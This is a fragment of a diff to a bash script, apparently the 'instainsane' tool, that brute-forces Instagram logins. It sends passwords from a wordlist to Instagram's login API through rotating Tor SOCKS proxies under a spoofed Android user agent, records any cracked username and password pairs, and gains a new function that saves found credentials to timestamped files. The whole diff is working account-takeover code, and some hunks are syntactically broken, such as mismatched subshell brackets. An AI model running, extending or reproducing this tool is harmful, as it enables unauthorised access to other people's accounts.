+    kill -1 $$ > /dev/null 2>&1
+  elif [[ "$var" == "Please wait" || -z "$var" ]]; then
+    echo "$pass" >> rockyou.txt
+  fi
+  } &
+    done < <(sed -n ''$startresume1','$(($token+endline))'p' $wl_pass)
+pid3=$! # wait $!
 
 let startline+=20
 let endline+=20
@@ -553,13 +619,13 @@ done
 bf4resume() {
 
 count_pass=$(wc -l "$wl_pass" | awk '{print $1}')
-while [ $counter4 -lt $turn ]; do
+while [ "$counter4" -lt "$turn" ]; do
 
 IFS=$'\n'
 startresume=$(grep -n -x "$pass" "$wl_pass" | cut -d ":" -f1)
 startresume1=$((startresume+1))
 IFS=$'\n'
-for pass in $(sed -n "${startresume1},$((token+endline))p" "$wl_pass"); do
+while IFS= read -r pass; do
 
 header='Connection: "close", "Accept": "*/*", "Content-type": "application/x-www-form-urlencoded; charset=UTF-8", "Cookie2": "$Version=1" "Accept-Language": "en-US", "User-Agent": "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'
 
@@ -576,20 +642,20 @@ printf "\e[1;77mTrying pass (%s/%s)\e[0m: \"%s\"\n" "$countpass" "$count_pass" "
 
 (
   trap '' SIGINT
-  var=$(curl --socks5-hostname 127.0.0.1:9054 -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/accounts/login/" | grep -o "logged_in_user\|challenge\|many tries\|Please wait" | uniq)
-  if [[ $var == "challenge" ]]; then
+  var=$(curl_wrapper --socks5-hostname 127.0.0.1:9054 -d "ig_sig_key_version=4&signed_body=$hmac.$data" --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/accounts/login/" 2>/dev/null | grep -o "logged_in_user\|challenge\|many tries\|Please wait" | uniq)
+  if [[ "$var" == "challenge" ]]; then
     printf "\e[1;92m \n [*] Password Found: %s\n [*] Challenge required\n" "$pass"
     printf "Username: %s, Password: %s\n" "$user" "$pass" >> found.instainsane
     printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instainsane \n\e[0m"
     rm -rf rockyou.txt
     kill -1 $$ > /dev/null 2>&1
-  elif [[ $var == "logged_in_user" ]]; then
+  elif [[ "$var" == "logged_in_user" ]]; then
     printf "\e[1;92m \n [*] Password Found: %s\n" "$pass"
     printf "Username: %s, Password: %s\n" "$user" "$pass" >> found.instainsane
     printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instainsane \n\e[0m"
     rm -rf rockyou.txt
     kill -1 $$ > /dev/null 2>&1
-  elif [[ $var == "Please wait" || -z "$var" ]]; then
+  elif [[ "$var" == "Please wait" || -z "$var" ]]; then
     echo "$pass" >> rockyou.txt
   fi
 ) &
@@ -608,14 +674,14 @@ done
 bf5resume() {
 
 count_pass=$(wc -l "$wl_pass" | awk '{print $1}')
-while [ $counter5 -lt $turn ]; do
+while [ "$counter5" -lt "$turn" ]; do
 
 IFS=$'\n'
 startresume=$(grep -n -x "$pass" "$wl_pass" | cut -d ":" -f1)
 startresume1=$((startresume+1))
 IFS=$'\n'
 range_end=$((token+endline))
-for pass in $(sed -n "${startresume1},${range_end}p" "$wl_pass"); do
+while IFS= read -r pass; do
 
 header='Connection: "close", "Accept": "*/*", "Content-type": "application/x-www-form-urlencoded; charset=UTF-8", "Cookie2": "$Version=1" "Accept-Language": "en-US", "User-Agent": "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'
 
@@ -632,25 +698,24 @@ printf "\e[1;77mTrying pass (%s/%s)\e[0m: \"%s\"\n" "$countpass" "$count_pass" "
 
 (
   trap '' SIGINT
-  var=$(curl --socks5-hostname 127.0.0.1:9055 -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --user-agent "$useragent" -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/accounts/login/" | grep -o "logged_in_user\|challenge\|many tries\|Please wait" | uniq)
-  if [[ $var == "challenge" ]]; then
+  var=$(curl_wrapper --socks5-hostname 127.0.0.1:9055 -d "ig_sig_key_version=4&signed_body=$hmac.$data" --user-agent "$useragent" -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/accounts/login/" 2>/dev/null | grep -o "logged_in_user\|challenge\|many tries\|Please wait" | uniq)
+  if [[ "$var" == "challenge" ]]; then
     printf "\e[1;92m \n [*] Password Found: %s\n [*] Challenge required\n" "$pass"
     printf "Username: %s, Password: %s\n" "$user" "$pass" >> found.instainsane
     printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instainsane \n\e[0m"
     rm -rf rockyou.txt
     kill -1 $$ > /dev/null 2>&1
-  elif [[ $var == "logged_in_user" ]]; then
+  elif [[ "$var" == "logged_in_user" ]]; then
     printf "\e[1;92m \n [*] Password Found: %s\n" "$pass"
     printf "Username: %s, Password: %s\n" "$user" "$pass" >> found.instainsane
     printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instainsane \n\e[0m"
     rm -rf rockyou.txt
     kill -1 $$ > /dev/null 2>&1
-  elif [[ $var == "Please wait" || -z "$var" ]]; then
+  elif [[ "$var" == "Please wait" || -z "$var" ]]; then
     echo "$pass" >> rockyou.txt
   fi
-) &
-
-done
+  } &
+    done < <(sed -n "${startresume1},${range_end}p" "$wl_pass")
 wait $pid1 > /dev/null 2>&1; wait $pid2 > /dev/null 2>&1; wait $pid3 > /dev/null 2>&1; wait $pid4 > /dev/null 2>&1; wait $! > /dev/null 2>&1
 
 let startline+=20
@@ -744,6 +809,7 @@ multitor
 killall -HUP tor
 
 # initialize wordlist counters safely (start() sets wl_pass)
+
 count_pass=$(wc -l "$wl_pass" 2>/dev/null | awk '{print $1}')
 count_pass=${count_pass:-0}
 countpass=1
@@ -769,3 +835,30 @@ killall -HUP tor
 done
 exit 1
 esac
+
+# -- Results summary: print found credentials (if any) and copy to Results.sh
+print_results() {
+  echo
+  echo "================= Results Summary ================"
+  if [ -f found.instainsane ] && [ -s found.instainsane ]; then
+    echo "Found credentials:"
+    nl -ba found.instainsane | sed -n '1,200p'
+    echo
+  # ensure results dir exists
+  mkdir -p results
+  # include PID ($$) and nanoseconds (if supported) to avoid collisions in parallel runs
+  ns=$(date +%N 2>/dev/null || echo "000000000")
+  ts="$(date +'%Y%m%d-%H%M%S')-$$-${ns}"
+  tsfile="results/${ts}.txt"
+  cp found.instainsane "$tsfile"
+  # append to master history log (timestamp and filename)
+  echo "$(date +'%Y-%m-%d %H:%M:%S')  $tsfile" >> results/history.log
+  echo "Saved results to: $tsfile"
+  else
+    echo "No credentials found."
+  fi
+  echo "=================================================="
+}
+
+# Call print_results when the script exits normally
+trap print_results EXIT
